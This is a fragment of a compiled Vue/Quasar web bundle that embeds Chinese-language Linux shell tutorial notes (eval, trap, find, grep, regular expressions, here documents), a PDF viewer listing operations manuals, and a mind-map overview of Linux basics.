continue命令\r\n\r\n类似C语言中的同名语句。可使for，while，until循环跳到下一次循环继续执行，循环变量取循环列表中的下一个。\r\n\r\n如 for x in 1 2 3\r\n\r\ndo \r\n\r\n echo before $x\r\n\r\n continue 1\r\n\r\n echo after $x\r\n\r\ndone\r\n\r\n**4)** ***\\*.\\****命令\r\n\r\n默认情况下，shell脚本程序会在一个新创建的环境中执行，所以当脚本对环境变量所做的任何修改都会丢失，而点(***\\*.\\****)命令允许执行的脚本程序改变当前的环境。\r\n\r\n5) echo命令\r\n\r\n输出一行字符内容并换行，若要使其不换行linux有两种解决方法：echo –n “string to output”\r\n\r\necho –e “string to output\\c”\r\n\r\n(注：-e是确保启用了反斜杠转义字符，\\c代表去掉换行符，\\t代表制表符，\\n代表回车 )\r\n\r\n6) eval命令\r\n\r\neval允许对参数进行求值，如下：\r\n\r\nfoo=10\r\n\r\nx=foo\r\n\r\ny=’$’$x\r\n\r\necho $y  #输出为foo\r\n\r\n当使用 eval命令时，如下\r\n\r\nfoo=10\r\n\r\nx=foo\r\n\r\neval  y=’$’$x\r\n\r\necho $y  #输出为 10\r\n\r\n7) exec命令\r\n\r\n将当前shell替换为一个不同的程序\r\n\r\n如：exec wall “Thanks for the fish”\r\n\r\n脚本中的这个命令会用wall命令替换当前的shell。\r\n\r\n第二种用法是修改当前文件描述符：\r\n\r\nexec 3< afile\r\n\r\n修改文件描述符。\r\n\r\n  \r\n\r\n8) exit n命令\r\n\r\n一般使脚本程序以退出码n结束运行。\r\n\r\n0表示成功，1~125是脚本可以使用的错误代码。\r\n\r\n126表示文件不可执行，127表示命令未找到\r\n\r\n128及以上 出现一个信号\r\n\r\n9) export 命令\r\n\r\nexport 命令可以将变量参数导出到子shell中，子shell中即可访问该变量。如 TESTA=testa；export TESTA\r\n\r\n10)  expr命令\r\n\r\n  expr命令将它的参数当做一个表达式来求值。\r\n\r\n11) printf命令\r\n\r\n  printf “format  string” parameter1 parameter2 \r\n\r\n12)return 命令\r\n\r\n   return命令作用是使函数返回，后面可带返回值，如果没有返回值则默认返回最后一条命令的退出码。\r\n\r\n  13)set命令\r\n\r\n示例：从系统提供的参数date中提取出月份。\r\n\r\n\\#!/bin/bash\r\n\r\necho the date is $(date)\r\n\r\nset $(date)\r\n\r\necho The month is $2\r\n\r\nexit 0\r\n\r\n14)shift命令\r\n\r\nshift命令把所有参数变量左移一个位置，使$2变成$1,$3变成$2,$1被丢弃，$0保持不变。\r\n\r\nwhile [ “$1” != “” ];do\r\n\r\n  echo “$1”\r\n\r\n  shift\r\n\r\ndone\r\n\r\nexit 0\r\n\r\n15)trap命令\r\n\r\n  Trap命令用于指定在接收信号后将要采取的行动。\r\n\r\n语法结构：***\\*trap\\**** command signal\r\n\r\n第一个参数是收到指定信号要采取的行动。\r\n\r\n第二个参数是要处理的信号名称。\r\n\r\n如果要忽略一个信号，则将第一个参数设为空字符串。\r\n\r\n\\#!/bin/bash\r\n\r\ntrap \'rm -f /home/sufeng/my_shell/my_tmp_file_$$\' INT\r\n\r\necho creating file /home/sufeng/my_shell/my_tmp_file_$$\r\n\r\ndate > /home/sufeng/my_shell/my_tmp_file_$$\r\n\r\n \r\n\r\necho "press interrupt (ctrl-c) to interrupt ...."\r\n\r\nwhile [ -f /home/sufeng/my_shell/my_tmp_file_$$ ];do\r\n\r\n  echo File exists\r\n\r\n  sleep 1\r\n\r\ndone\r\n\r\n \r\n\r\necho the file no longer exists\r\n\r\n \r\n\r\ntrap INT\r\n\r\n \r\n\r\necho creating file /home/sufeng/my_shell/my_tmp_file_$$\r\n\r\ndate > /home/sufeng/my_shell/my_tmp_file_$$\r\n\r\necho "press interrupt (control-c) to interrupt ...."\r\n\r\nwhile [ -f /home/sufeng/my_shell/my_tmp_file_$$ ];do\r\n\r\n  echo File exists\r\n\r\n  sleep 1\r\n\r\ndone\r\n\r\necho we never get here\r\n\r\n16)unset命令\r\n\r\n  unset命令的作用是从环境中删除变量或函数。但不能删除shell本身定义的只读变量。\r\n\r\n  \\#!/bin/bash\r\n\r\nfoo="hello world"\r\n\r\necho $foo\r\n\r\nunset foo\r\n\r\necho $foo\r\n\r\n17)find命令\r\n\r\nfind语法结构：\r\n\r\nfind  [path]  [options]  [tests]  [actions]\r\n\r\n***\\*path\\**** 是要搜索的路径。\r\n\r\n***\\*O\\*******\\*ptions\\**** 选项:\r\n\r\n-depth   在查看目录本身之前先搜素目录的内容\r\n\r\n-follow   跟随符号链接\r\n\r\n-maxdepths N  最多搜索N层目录\r\n\r\n-mount(或-xdev)  不搜索其他文件系统中的目录\r\n\r\n***\\*T\\*******\\*ests选项\\****：\r\n\r\n-atime N  文件在N天之前被访问过\r\n\r\n-mtime N  文件在N天之前被修改过\r\n\r\n-name  “pattern” 按文件名称匹配\r\n\r\n-newer otherfile 文件比otherfile要新\r\n\r\n-type  c 文件类型为c\r\n\r\n-user username  文件的拥有者是指定用户。\r\n\r\n***\\*对tests部分的组合\\****：\r\n\r\n！  (-not)   测试取反\r\n\r\n-a   (-and)   两个测试都必须为真\r\n\r\n-o   (-or)   两个测试必须有一个为真 \r\n\r\n \r\n\r\n***\\*动作\\****：\r\n\r\n-exec  command  执行一条命令\r\n\r\n-ok  command    同上，只是处理时回头提示\r\n\r\n-print   打印文件名\r\n\r\n-ls     对当前文件使用命令 ls-dils\r\n\r\n***\\*一个find的示例：\\****\r\n\r\n***\\*sufeng@linux-ecmc:~/my_shell> find \\( -name "\\*1.sh" -o -atime 2 \\) -type f -exec ls -l {} \\;\\****\r\n\r\n***\\*结果如下：\\****\r\n\r\n-rwxrwxrwx 1 sufeng users 91 Sep  5 18:54 ./bb1.sh\r\n\r\n-rwxr--r-- 1 sufeng users 258 Sep  4 20:41 ./t_fun1.sh\r\n\r\n-rwxr--r-- 1 sufeng users 174 Sep  4 18:11 ./tm_case1.sh\r\n\r\n-rwxrwxrwx 1 sufeng users 39 Sep  5 18:35 ./cc1.sh\r\n\r\n-rwxrwxrwx 1 sufeng users 167 Sep  1 11:43 ./tm1.sh\r\n\r\n \r\n\r\n18)grep命令\r\n\r\ngrep语法如下:\r\n\r\ngrep  [options]  PATTERN  [FILES]\r\n\r\n选项            含义\r\n\r\n -c      输出匹配行的数目，而不是输出匹配行\r\n\r\n -i       忽略大小写\r\n\r\n -v       对匹配模式取反\r\n\r\n -l      只列出匹配行的文件名\r\n\r\n -E      启用扩展表达式\r\n\r\n -h      取消输出行普通前缀。\r\n\r\n 示例：\r\n\r\n grep -c -v in bb.sh cc.sh\r\n\r\n grep -c in bb.sh cc.sh\r\n\r\n19)正则表达式\r\n\r\n 字符            含义\r\n\r\n  ^           指向一行的开头\r\n\r\n  $           指向一行的结尾\r\n\r\n  .            任意单个字符\r\n\r\n  []      方括号包含一个字符范围，其中任何一个字符都可以匹配，如a~e，在字符范围前面加^，即不在指定范围内。\r\n\r\n 匹配模式              含义\r\n\r\n [:alnum:]            字母与数字字符\r\n\r\n [:alpha:]            字母\r\n\r\n [:ascii:]             ASCII 字符\r\n\r\n [:blank:]             空格或制表符\r\n\r\n [:cntrl:]             ASCII控制字符\r\n\r\n [:digit:]             数字\r\n\r\n [:graph:]            非控制、非空格字符\r\n\r\n [:lower:]            小写字母\r\n\r\n[:print:]               可打印字符\r\n\r\n[:punct:]              标点符号字符\r\n\r\n[:space:]            空白字符，包括垂直制表符\r\n\r\n[:upper:]               大写字母\r\n\r\n[:xdigit:]               十六进制数字\r\n\r\n \r\n\r\n选项                含义\r\n\r\n ？            匹配是可选的，但最多匹配一次\r\n\r\n​    \\*             必须匹配0次或多次\r\n\r\n​    \\+             必须匹配1次或多次\r\n\r\n   {n}             必须匹配n次\r\n\r\n   {n,}            必须匹配n次或n次以上\r\n\r\n   {n，m}         必须匹配n到m之间，包括n和m\r\n\r\n以上使用的时候需要加’\\’.\r\n\r\n示例：\r\n\r\ngrep  e$  bb.sh      以e结尾\r\n\r\ngrep  a[[:blank:]] bb.sh   以a结尾\r\n\r\ngrep  Th.[[:blank:]] bb.sh  匹配以Th开头的3个字符组成的单词\r\n\r\ngrep  -E [a-z]\\{10\\} bb.sh  匹配只有10个字符常的全由小写字母组成的单词。\r\n\r\n \r\n\r\n \r\n\r\n20)命令的执行\r\n\r\n  $(command)\r\n\r\n \\#!/bin/bash\r\n\r\n whoisthere=$(who)  将who显示的内容给变量\r\n\r\n echo $whoisthere  \r\n\r\n exit 0 \r\n\r\n***\\*算数扩展\\****\r\n\r\n \\#!/bin/bash\r\n\r\n  X=0\r\n\r\n  while [ “$X” –ne 10 ]; do\r\n\r\n   echo  $X\r\n\r\n   x=$(($x+1))\r\n\r\n done\r\n\r\nexit 0\r\n\r\n注意 使用$时，后面有两个括弧和一个括弧是有区别的，一个是赋只给变量，两个是进行算数运算。\r\n\r\n***\\*参数扩展\\****\r\n\r\n示例：\r\n\r\n如果有两个文件 1_tmp和2_tmp\r\n\r\n\\#！/bin/bash\r\n\r\nfor i in 1 2\r\n\r\ndo\r\n\r\n  my_secret_process ***\\*$i_tmp\\****\r\n\r\ndone\r\n\r\n此时，又有错误信息，应该为my_secret_process ***\\*${i}_tmp\\****\r\n\r\n \r\n\r\n***\\*参数扩展              说明\\****\r\n\r\n ${param:-default}        若param为空，则值为default\r\n\r\n ${#param}          给出param的长度\r\n\r\n ${param%word}  从尾部开始删除与word匹配的最小部分\r\n\r\n ${param%%word} 从尾部开始删除与word匹配的最长部分\r\n\r\n ${param#word}   从param的头部开始删除匹配的最小部分\r\n\r\n${param##word}  从param的头部开始删除匹配的最小部分\r\n\r\n21)here文档\r\n\r\n 可以将部分字符内容存储在脚本中，以特定的字符标示起始和结尾。\r\n\r\n示例;\r\n\r\n\\#!/bin/bash\r\n\r\ncat  <<!FUNKY!\r\n\r\nhello\r\n\r\nthis is a here\r\n\r\ndocument\r\n\r\n!FUNKY!\r\n\r\n示例2:  使用ed编辑器\r\n\r\n\\#!/bin/bash\r\n\r\ned  a_text_file  <<!FunkyStuff!\r\n\r\n3\r\n\r\nd\r\n\r\n.,\\$s/is/was/\r\n\r\nw\r\n\r\nq\r\n\r\n!FunkyStuff!\r\n\r\nexit 0\r\n\r\n \r\n\r\n其中 a_text_file 文件中内容如下\r\n\r\nThat is line 1\r\n\r\nThat is line 2\r\n\r\nThat is line 3\r\n\r\nThat is line 4\r\n\r\n ',x={data:function(){return{MainComponent:_}}},w=x,E=Object(c["a"])(w,y,f,!1,null,"e490d1f2",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"row  "},[t("q-select",{staticStyle:{width:"500px"},attrs:{"use-input":"","input-debounce":"0",clearable:"",options:n.book_options},on:{filter:n.filterFn},model:{value:n.book,callback:function(r){n.book=r},expression:"book"}},[t("template",{slot:"before"},[t("div")])],2)],1),t("div",{staticClass:"q-pdfviewer-container   "},[t("q-pdfviewer",{attrs:{src:n.src,type:"html5","content-class":" fit   q-pdfviewer-container","inner-content-class":" fit   q-pdfviewer-container"},model:{value:n.show,callback:function(r){n.show=r},expression:"show"}})],1)])},C=[],j=t("1b62"),M=["CDN排坑指南.pdf","DTS控制台一本通.pdf","ECS运维指南-linux诊断.pdf","ECS运维指南-windows诊断.pdf","Linux学习笔记.pdf","OSS运维-进阶手册.pdf","OSS运维u-基础书册.pdf","RDS数据库一本通.pdf","Rocket MQ 使用排查指南.pdf","VOD问题排查与实战手册.pdf","深入浅出K8S.pdf","深入浅出玩转物联网平台.pdf"],R="linux/pdf/",L={mixins:[j["b"]],data:function(){return{prefix:R,book_options:M,show:!0,book:M[0],src:""}}},O=L,A=Object(c["a"])(O,k,C,!1,null,null,null),I=A.exports,D=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},P=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("div",{staticClass:"markdown_views prism-atom-one-dark",attrs:{id:"content_views"}},[t("blockquote",[t("p",[n._v("本文主要是Linux的入门内容，利用40张思维导图从"),t("strong",[n._v("基础、操作、实用指令、组管理和权限管理、crond任务调度、Linux磁盘分区和挂载、Linux网络环境配置、进程管理、服务管理、RPM和YUM、软件安装关键点、Shell编程共十二部分着手")]),n._v("，从而系统的了解一下Linux（基于Centos），本文的定位是前端工程师够用、运维工程师入门。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNDQzMTBjYjU3ZGE.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t0"}}),t("a",{attrs:{name:"t0"}}),t("a",{attrs:{id:"_6"}}),n._v("一、基础")]),t("blockquote",[t("p",[n._v("主要阐述了什么是Linux、主要发行版有什么、如何在自己利用VM安装自己的Linux系统、Linux树形目录结构及相关目录的用途。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNDQ3OGE2MDQwNzk.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t1"}}),t("a",{attrs:{name:"t1"}}),t("a",{attrs:{id:"_10"}}),n._v("二、操作")]),t("blockquote",[t("p",[n._v("主要介绍了Xftp5、XShell工具及vi和vim编辑器的使用。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNDRhM2Y2OWFkMzI.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t2"}}),t("a",{attrs:{name:"t2"}}),t("a",{attrs:{id:"_14"}}),n._v("三、实用指令")]),t("blockquote",[t("p",[n._v("主要阐述了一系列实用指令，包括：关机&重启命令；用户登录和注销；用户管理；切换到指定运行级别；帮助指令；文件目录类；时间日期类；搜索查找类；压缩和解压类。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNGZjNmVhZDYyMDg.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t3"}}),t("a",{attrs:{name:"t3"}}),t("a",{attrs:{id:"31__18"}}),n._v("3.1 关机&重启命令")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNGZlNDFlOTRlMzc.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t4"}}),t("a",{attrs:{name:"t4"}}),t("a",{attrs:{id:"32__20"}}),n._v("3.2 用户登陆和注销")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNGZmYjQ1MDcwNTE.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t5"}}),t("a",{attrs:{name:"t5"}}),t("a",{attrs:{id:"33__22"}}),n._v("3.3 用户管理")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTAwZmJiZGU5MGU.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t6"}}),t("a",{attrs:{name:"t6"}}),t("a",{attrs:{id:"34__24"}}),n._v("3.4 切换到指令运行级别")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTAyODdlYmFkZWU.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t7"}}),t("a",{attrs:{name:"t7"}}),t("a",{attrs:{id:"35__26"}}),n._v("3.5 帮助指令")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTAzYzI2NGRjODk.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t8"}}),t("a",{attrs:{name:"t8"}}),t("a",{attrs:{id:"36__28"}}),n._v("3.6 文件目录类")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTA1M2JkMzZiMzQ.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t9"}}),t("a",{attrs:{name:"t9"}}),t("a",{attrs:{id:"37__30"}}),n._v("3.7 时间日期类")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTA3MzVkMDc2YjE.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t10"}}),t("a",{attrs:{name:"t10"}}),t("a",{attrs:{id:"38__32"}}),n._v("3.8 搜索查找类")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTA4ODJjZDNlOGY.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t11"}}),t("a",{attrs:{name:"t11"}}),t("a",{attrs:{id:"39__34"}}),n._v("3.9 压缩和解压类")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTA5Yzc0NTVlMDg.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t12"}}),t("a",{attrs:{name:"t12"}}),t("a",{attrs:{id:"_36"}}),n._v("四、组管理和权限管理")]),t("blockquote",[t("p",[n._v("主要阐述了组管理及权限管理相关的内容。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTBmYzU1MTc5NjI.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t13"}}),t("a",{attrs:{name:"t13"}}),t("a",{attrs:{id:"crond_40"}}),n._v("五、crond任务调度")]),t("blockquote",[t("p",[n._v("主要阐述了crond任务调度，使系统在某个时间执行特定的命令或程序")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTEzNzViNDc4MjA.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t14"}}),t("a",{attrs:{name:"t14"}}),t("a",{attrs:{id:"Linux_44"}}),n._v("六、Linux磁盘分区、挂载")]),t("blockquote",[t("p",[n._v("主要阐述了Linux磁盘分区、挂载，使开发者能够自己增加一块硬盘")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTE1NjIwNzAwYzk.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t15"}}),t("a",{attrs:{name:"t15"}}),t("a",{attrs:{id:"Linux_48"}}),n._v("七、Linux网络环境配置")]),t("blockquote",[t("p",[n._v("主要阐述了Linux网络环境配置中的自动获取IP和指定固定的IP，从而实现网络连接。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNTE3NTNiMDYxMjk.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t16"}}),t("a",{attrs:{name:"t16"}}),t("a",{attrs:{id:"_52"}}),n._v("八、进程管理")]),t("blockquote",[t("p",[n._v("主要阐述了与进程管理相关的内容，包括基本概念、显示执行的进程、查看进程树、终止进程、动态监控进程、查看系统网络情况及进程状态。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWMzMmViYjE3NmY.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t17"}}),t("a",{attrs:{name:"t17"}}),t("a",{attrs:{id:"81__56"}}),n._v("8.1 基本")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWM0OGM2NWJhNGU.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t18"}}),t("a",{attrs:{name:"t18"}}),t("a",{attrs:{id:"82__58"}}),n._v("8.2 显示执行的进程")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWM1OTQyNmNiNDU.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t19"}}),t("a",{attrs:{name:"t19"}}),t("a",{attrs:{id:"83__60"}}),n._v("8.3 查看进程树")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWM2ODQ0YjkxMDg.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t20"}}),t("a",{attrs:{name:"t20"}}),t("a",{attrs:{id:"84__62"}}),n._v("8.4 终止进程")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWM3NTRmNDAyYmU.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t21"}}),t("a",{attrs:{name:"t21"}}),t("a",{attrs:{id:"85__64"}}),n._v("8.5 动态监控进程")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWM4MzY4ZGMxM2E.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t22"}}),t("a",{attrs:{name:"t22"}}),t("a",{attrs:{id:"86__66"}}),n._v("8.6 查看系统网络情况")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWM5MGJjY2ZkMTg.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t23"}}),t("a",{attrs:{name:"t23"}}),t("a",{attrs:{id:"87__68"}}),n._v("8.7 进程状态")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWNhMGQxODQ0ZTM.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t24"}}),t("a",{attrs:{name:"t24"}}),t("a",{attrs:{id:"_70"}}),n._v("九、服务管理")]),t("blockquote",[t("p",[n._v("主要阐述了何为服务以及与服务管理相关的一些列指令。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWQxODhjMWM1ZjE.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t25"}}),t("a",{attrs:{name:"t25"}}),t("a",{attrs:{id:"RPMYUM_74"}}),n._v("十、RPM和YUM")]),t("blockquote",[t("p",[n._v("主要阐述了Linux系统中软件安装的两种方式：rpm和yum。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWQ4MDQ1YTc1YTU.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t26"}}),t("a",{attrs:{name:"t26"}}),t("a",{attrs:{id:"_78"}}),n._v("十一、软件安装关键点")]),t("blockquote",[t("p",[n._v("阐述了软件安装中需要注意的关键点：如何配置环境变量及开放对应端口。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNWRjMjQ3NDA0N2Y.png",alt:""}})]),t("h2",[t("a",{attrs:{name:"t27"}}),t("a",{attrs:{name:"t27"}}),t("a",{attrs:{id:"Shell_82"}}),n._v("十二、Shell编程")]),t("blockquote",[t("p",[n._v("主要阐述与Linux操作息息相关的Shell编程中的一些基础语法。")])]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjY2MTEwYWNkYjE.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t28"}}),t("a",{attrs:{name:"t28"}}),t("a",{attrs:{id:"121__86"}}),n._v("12.1 基本介绍")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjY3NTU4MDZhNmM.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t29"}}),t("a",{attrs:{name:"t29"}}),t("a",{attrs:{id:"122__88"}}),n._v("12.2 基本使用")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjY4MTllNWI3N2M.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t30"}}),t("a",{attrs:{name:"t30"}}),t("a",{attrs:{id:"123_shell_90"}}),n._v("12.3 shell的变量")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjY4ZWU4NDBiOTE.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t31"}}),t("a",{attrs:{name:"t31"}}),t("a",{attrs:{id:"124__92"}}),n._v("12.4 注释")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjY5ZTUwMjEyN2I.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t32"}}),t("a",{attrs:{name:"t32"}}),t("a",{attrs:{id:"125__94"}}),n._v("12.5 字符串")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjZhYzM2YWM1M2Y.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t33"}}),t("a",{attrs:{name:"t33"}}),t("a",{attrs:{id:"126__96"}}),n._v("12.6 数组")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjZiYTI2MTNkNWM.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t34"}}),t("a",{attrs:{name:"t34"}}),t("a",{attrs:{id:"127__98"}}),n._v("12.7 运算符")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjZjZTUwMTUyMjU.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t35"}}),t("a",{attrs:{name:"t35"}}),t("a",{attrs:{id:"128__100"}}),n._v("12.8 条件判断")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjZkZWY4MmI1NGI.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t36"}}),t("a",{attrs:{name:"t36"}}),t("a",{attrs:{id:"129__102"}}),n._v("12.9 流程控制")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjZlZmQ2Y2RmYmI.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t37"}}),t("a",{attrs:{name:"t37"}}),t("a",{attrs:{id:"1210_read_104"}}),n._v("12.10 read读取控制台输入")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjZmZTI2YWYxZGI.png",alt:""}})]),t("h3",[t("a",{attrs:{name:"t38"}}),t("a",{attrs:{name:"t38"}}),t("a",{attrs:{id:"1211__106"}}),n._v("12.11 函数")]),t("p",[t("img",{attrs:{src:"img/linux/xmind-img/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAyMC82LzIzLzE3MmRmNjcwZGFjNDhjZmI.png",alt:""}})])])])}],N={data:function(){return{}}},q=N,H=Object(c["a"])(q,D,P,!1,null,"654ef60c",null),B=H.exports,F=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},U=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{staticClass:"q-py-md"},[t("div",[t("a",{attrs:{href:"http://rpm.pbone.net",target:"_blank",rel:"noopener noreferrer"}},[n._v("a. 去官网去下载（http://rpm.pbone.net）；")])]),t("div",[n._v("### MobaXterm 官网： "),t("a",{attrs:{href:"https://mobaxterm.mobatek.net/",target:"_blank",rel:"noopener noreferrer"}},[n._v("https://mobaxterm.mobatek.net/")])]),t("div",[n._v("\n      yum 阿里云镜像 源\n      